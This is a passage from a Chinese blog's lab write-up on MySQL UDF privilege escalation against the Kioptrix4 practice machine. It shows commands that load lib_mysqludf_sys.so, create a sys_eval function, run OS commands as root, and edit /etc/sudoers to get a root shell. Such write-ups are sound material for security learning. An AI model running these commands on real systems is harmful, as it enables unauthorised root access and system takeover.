+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">john@Kioptrix4:~$ whereis lib_mysqludf_sys.so
+</span></span><span class="line"><span class="cl">lib_mysqludf_sys: /usr/lib/lib_mysqludf_sys.so
+</span></span></code></pre></div><p><strong>登录数据库</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">john@Kioptrix4:~$ mysql -u root -p           
+</span></span><span class="line"><span class="cl">Enter password: XXXXX
+</span></span></code></pre></div><p><strong>进入mysql库</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">mysql&gt; use mysql
+</span></span><span class="line"><span class="cl">Database changed
+</span></span></code></pre></div><p><strong>创建sys_eval函数</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">mysql&gt; create <span class="k">function</span> sys_eval returns string soname <span class="s2">&#34;lib_mysqludf_sys.so&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">Query OK, <span class="m">0</span> rows affected <span class="o">(</span>0.00 sec<span class="o">)</span> 
+</span></span></code></pre></div><p><strong>尝试执行</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">mysql&gt; <span class="k">select</span> sys_eval<span class="o">(</span><span class="s1">&#39;whoami&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">+--------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> sys_eval<span class="o">(</span><span class="s1">&#39;whoami&#39;</span><span class="o">)</span> <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+--------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> root
+</span></span><span class="line"><span class="cl">              <span class="p">|</span> 
+</span></span><span class="line"><span class="cl">+--------------------+
+</span></span><span class="line"><span class="cl"><span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.01 sec<span class="o">)</span>
+</span></span></code></pre></div><p>此时账户为root权限，可以用root去执行任意命令实现任意操作了。</p>
+<p><strong>靶机的情况下，到这里已经可以看到root目录下的flag文件了。</strong></p>
+<!-- raw HTML omitted -->
+<p><strong>如何想要完全拿到root的shell，可通过修改sudo配置文件的方式实现。</strong>（不止这一种，在 2 中 还有另一种方法）</p>
+<ul>
+<li>
+<p>假设当前为服务器低权限账户john</p>
+</li>
+<li>
+<p>先修改属主，后赋予写权限。</p>
+</li>
+</ul>
+<p>​</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">	mysql&gt; <span class="k">select</span> sys_eval<span class="o">(</span><span class="s1">&#39;chown john /etc/sudoers&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">​		chmod +w /etc/sudoers
+</span></span></code></pre></div><ul>
+<li>写入内容如图</li>
+</ul>
+<p><img src="../../images/image-20231003160330885.png" alt="image-20231003160330885"></p>
+<ul>
+<li>然后恢复权限，否则sudo会报错</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">mysql&gt; <span class="k">select</span> sys_eval<span class="o">(</span><span class="s1">&#39;chown root /etc/sudoers&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">chmod -w /etc/sudoers
+</span></span></code></pre></div><ul>
+<li>执行 sudo su - 即可</li>
+</ul>
+</div>
+    <footer class="article-footer"><ul class="article-category-list"><li class="article-tag-list-item" data-aos="zoom-in">
+    <a
+      class="article-category-link"
+      href="/categories/%e6%8f%90%e6%9d%83"
+      data-aos="zoom-in"
+      >提权</a
+    >
+    </li></ul>
+<ul class="article-tag-list" itemprop="keywords"></ul>
+</footer>
+  </div><nav
+    id="article-nav"
+    aria-label="Article navigation"
+    data-aos="fade-up"
+  ><div class="article-nav-link-wrap left"><img
+              data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
+              data-sizes="auto"
+              alt="Nullbyte靶机"
+              class="lazyload"
+            /><a
+          href="/post/%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/0x05-nullbyte/"
+          aria-label="前一篇:Nullbyte靶机"
+          title="前一篇:Nullbyte靶机"
+        ></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">Nullbyte靶机</h3>
+      </div><div class="article-nav-link-wrap right"><img
+              data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
+              data-sizes="auto"
+              alt="MERCY靶机"
+              class="lazyload"
+            /><a
+          href="/post/%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/0x03-mercy-v2/"
+          aria-label="后一篇:MERCY靶机"
+          title="后一篇:MERCY靶机"
+        ></a>
+        <div class="article-nav-caption">后一篇</div>
+        <h3 class="article-nav-title">MERCY靶机</h3>
+      </div></nav></article></section>
+        </div><footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info"><div>
+      <span class="icon-copyright"></span>2020-2026<span class="footer-info-sep rotate"></span>L
+    </div><div>
+        基于&nbsp;<a
+          href="https://gohugo.io/"
+          target="_blank"
+          rel="noopener nofollow noreferrer"
+          >Hugo</a
+        >&nbsp;Theme.<a
+          href="https://github.com/D-Sketon/hugo-theme-reimu"
+          target="_blank"
+          rel="noopener nofollow noreferrer"
+          >Reimu</a
+        >
+      </div><div>
+        <span class="icon-brush"
+          >&nbsp;73.0k</span
+        >
+        &nbsp;|&nbsp;
+        <span class="icon-coffee">&nbsp;03:05</span>
+      </div><div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv"
+          >总访问量&nbsp;<span
+            id="busuanzi_value_site_pv"
+          ></span
+        ></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv"
+          >总访客量&nbsp;<span
+            id="busuanzi_value_site_uv"
+          ></span
+        ></span>
+      </div></div>
+</footer>
+<div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div><div id="mask" class="hide"></div>
+      </div><nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap"><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#1检查前提条件安装udf插件的前提条件">1.检查前提条件（安装udf插件的前提条件）</a></li>
+    <li><a href="#2安装udf插件">2.安装UDF插件</a></li>
+    <li><a href="#3利用如果mysql已经安装udf插件的情况下可直接使用以下步骤提权">3.利用（如果，mysql已经安装udf插件的情况下，可直接使用以下步骤提权）</a></li>
+  </ul>
+</nav>
+</div></div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="L"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">L</div>
+  <div class="sidebar-description">少女祈祷中...</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">74</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      15
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>标签</div>
+    <div class="sidebar-state-number">20</div>
+  </a>
+</div>
+<div class="sidebar-social" ></div><div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="友链"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">友链</div>
+    </div></div></div></div><div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div></nav>
+</div><script
+    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
+    
+    
+    
+    
+    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
+    
+    
+    
+    
+    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script><script src="/js/main.js"  ></script><script src="/js/aos.js"  ></script><script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", aosInit);
+    } else {
+      aosInit();
+    }
+  </script><script src="/js/pjax_main.js" data-pjax ></script><script>
+  var setupFirework = () => {
+    if (! false  || !window.matchMedia('(max-width: 768px)').matches) {
+      if (window.firework) {
+        const options = JSON.parse("{\"excludeelements\":[\"a\",\"button\"],\"particles\":[{\"colors\":[\"var(--red-1)\",\"var(--red-2)\",\"var(--red-3)\",\"var(--red-4)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"emit\"],\"number\":20,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.3,0.5],\"radius\":[16,32]}},{\"colors\":[\"var(--red-0)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"diffuse\"],\"number\":1,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.2,0.5],\"lineWidth\":6,\"radius\":20}}]}");
+        options.excludeElements = options.excludeelements;
+        delete options.excludeelements;
+        window.firework(options);
+      }
+    }
+  }
+</script><script
+    src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js"
+    defer
+    
+    
+    onload="setupFirework()"
+    integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8&#43;pUoWX8n1rgq282T" crossorigin="anonymous"></script>
+
+<div id="lazy-script">
+  <div><script data-pjax>
+        window.REIMU_POST = {
+          author: "L",
+          title: "mysql_udf提权",
+          url: "http:\/\/localhost:1313\/post\/%E6%8F%90%E6%9D%83\/mysql_udf%E6%8F%90%E6%9D%83\/",
+          description: "\r一、简介\r​\tUDF(用户自定义函数)，是mysql中的一个扩展插件。作用是可以让用户通过自定义函数来实现在MySQL中无法实现的功能。\n二、条件\r需要有mysql账户权限（creat、insert、delete），最好为root。\n",
+          cover: "http:\/\/localhost:1313\/images\/banner.webp",
+        };
+      </script><script src="/js/insert_highlight.js" data-pjax ></script><script src="/js/tabs.js" data-pjax defer></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const initPswp = (gallery, children) => {
+          if (_$$(`${gallery} ${children}`).length > 0) {
+            new PhotoSwipeLightbox({
+              gallery,
+              children,pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+        }
+        const pswp = () => {
+          initPswp('.article-entry', 'a.article-gallery-item');
+          initPswp('.article-gallery', 'a.article-gallery-item');
+        }
+        pswp()
+      </script></div>
+</div><script
+    src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js"
+    
+    async
+    
+    
+    integrity="sha384-0M75wtSkhjIInv4coYlaJU83&#43;OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id&#43;S" crossorigin="anonymous"></script><script>
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.getRegistrations().then((registrations) => {
+        for (let registration of registrations) {
+          registration.unregister();
+        }
+      });
+    }
+  </script><script>
+  const reimuCopyright = String.raw`
+   ______     ______     __     __    __     __  __    
+  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                    
+  `;
+  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
+  console.log(
+    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
+    "color: white; background: #ff5252; padding:5px 0;",
+    "padding:4px;border:1px solid #ff5252;",
+  );
+</script></body>
+</html>
